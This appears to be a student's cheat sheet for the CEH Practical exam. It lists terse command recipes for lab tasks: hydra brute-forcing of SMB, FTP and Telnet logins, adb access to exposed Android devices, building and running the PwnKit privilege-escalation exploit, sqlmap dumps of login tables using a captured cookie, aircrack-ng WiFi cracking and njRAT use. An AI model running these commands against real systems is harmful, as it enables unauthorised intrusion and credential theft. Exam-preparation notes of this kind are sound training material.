# CEH PRACTICAL
#  FQDN
* nmap -p389 -sV (subnet) -Pn
           OR
* nmap -A <subnet> -Pn

#  WAMP SERVER
* nmap -A -sV -p 80,8080,443 (subnet)

#  SMB 
* nmap -p 445 (subnet)
* hydra -l Henry -P (password.txt file on desktop) (ip) smb
* smbclient -L ip -p 1445 -U Henry
* smbclient -L //ip/Home -p 1445 -U Henry
* get (file name) password same as Henry
* if file contains hash decode it

#  Android
* namp -p 5555 (subnet) -Pn
* adb connect (ip):5555
* adb shell
* ls (find the folder scan)
* after finding scan coppy rhe directory
* exit
* adb pull (paste the directory)(be a root user)
* cd Scan
* ls
* ent (file1)
* ent (file2)
* ent (file3)
* sha384sum (file with highest ent)

#  SEVERITY
* nmap -Pn --script vuln (ip)
* CVE check on google nvd.nist.gov

#  REMOTE LOGIN SENSITIVE FILE
* nmamp (subnet) -Pn
* ( find ip with FTP or Telnet)
* hydra -L (username.txt) -P (password.txt) (ip) telnet
                          OR
* hydra -L (username.txt) -P (password.txt) (ip) ftp
* telnet (ip)
     OR
* ftp (ip)
* ls
* get NetworkPass.txt

#  STEGNOGRAPHY
* login into given machine
* open openstego
* extract data
* output on desktop
* password "imagination"

#  FTP
* nmamp (subnet) -Pn
* hydra -L (username.txt) -P (password.txt) (ip) ftp
* ftp (ip)
* ls
* get Credential.txt
* cat Credential.txt

#  PRIVILEGE ESCALATION
* login with RDP
* terminal
* mkdir /tmp/pwnkit
* mv CVE-2021-4034 /tmp/pwnkit/
* cd /tmp
* cd pwnkit
* cd CVE-2021-4034/
* make
* ./CVE-2021-4034 

#  ENTRYPOINT ADRDRESS
* login into ggiven machine
* open DIE (detect it easy)
* open the given file in DIE
* File Info option

#  DDOS 
* open the file in wireshark
* statistics option
* IP v4 statistics
* Source and Destination
* tcp.flags.syn == 1 and tcp.flags.ack == 0

#  SQL injection PASSWORD
* login in website
* view profile tab and note the url
* inspect
* console type (document.cookie)
* terminal
* be a root user
* sqlmap -u "(url)" --cookie="(cookie val)" --dbbs
* yes for all
* sqlmap -u "(url)" --cookie="(cookie val)" -D (website name) --tables
* sqlmap -u "(url)" --cookie="(cookie val)" -D (website name) -T (longin table) --dump

#  SQL BURPSUITE
* open site
* meneu > preferences > search proxy > manual proxy > http proxy 127.0.0.1 > port 8080 > check also use this proxy for ftp
* burp suite > temp project > burp defaults > start burp >
* Terminal
* sqlmap -r (burp file directorry) --dbs
* sqlmap -r (burp file directorry) --dbs -D (database namme) --tables --columns
* sqlmap -r (burp file directorry) --dbs -D (database namme) --tables -T (table name) --dump

#  FILE INCLUSION/UPLOAD

#  SQLMAP

#  HASH,DVWA
* login with credentials
* go to file and download
* open the file coppy hash and paste in hashes.com or crackstation.com

#  IOT TRAFFIC
* open the file in wireshark
* mqtt (in the filter option) 
* click on publish message
* mqtt protocol

#  WIFI
* aircrack-ng -w(password file directory) (file directory) 

#  njRAT
* open njRAT 
* search and download the file

#  VERACRYPT
* crack the hash first
* open veracrypt and use the cracked hash as passwors
